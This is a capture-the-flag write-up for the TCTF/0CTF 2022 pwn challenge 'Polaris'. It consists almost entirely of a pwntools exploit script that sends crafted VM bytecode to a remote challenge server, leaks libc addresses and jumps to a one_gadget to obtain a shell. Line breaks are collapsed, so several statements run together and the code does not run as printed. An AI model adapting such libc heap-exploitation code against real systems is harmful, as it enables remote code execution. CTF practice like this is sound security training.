# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/TCTF-0CTF_2022-Polaris_Writeup.md
# TITLE: TCTF/0CTF 2022-Polaris  Writeup
# CATEGORY: pwn

# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
sh = Shell()sh.sendlineafter(b'0ctf2022!!n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x800).encode())sh.sendlineafter(b'code:n', p8(23))sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())
payload = b''payload += p8(22) + p8(0) + p64(0)
payload += p8(20) + p8(3) + p64(libc.sym['_IO_2_1_stdin_'])payload += p8(0) + p8(0)payload += p8(0) + p8(3)payload += p8(3)payload += p8(20) + p8(3) + p64(0xfffffffffffff000)payload += p8(0) + p8(3)payload += p8(9)payload += p8(1) + p8(0)
payload += p8(21) + p8(0) + p64(0x70)
sh.sendlineafter(b'code:n', payload + p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x38).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x18).encode())sh.sendlineafter(b'memory count:n', str(3).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1e8).encode())sh.sendlineafter(b'memory count:n', str(0x80 + 0x4000000000000000).encode())
# g()payload = b''payload += p8(22) + p8(0) + p64(0x70)payload += p8(22) + p8(1) + p64(0)payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x1000)payload += p8(0) + p8(3)payload += p8(4)payload += p8(20) + p8(3) + p64(0x4a0)payload += p8(0) + p8(3)payload += p8(2)payload += p8(1) + p8(1)

# offset = 0x26b2e0offset = 0x2672e0success('offset: ' + hex(offset))payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(offset)payload += p8(0) + p8(3)payload += p8(2)payload += p8(0) + p8(1)payload += p8(3)payload += p8(20) + p8(3) + p64(8)payload += p8(0) + p8(3)payload += p8(5)payload += p8(1) + p8(2)
payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x46e8)payload += p8(0) + p8(3)payload += p8(3)payload += p8(1) + p8(3)
payload += p8(21) + p8(2) + p64(0xa0)
payload += p8(21) + p8(3) + p64(0)
payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(0xebcf1)payload += p8(0) + p8(3)payload += p8(2)
sh.sendlineafter(b'code:n', payload + p8(1))
sh.interactive()
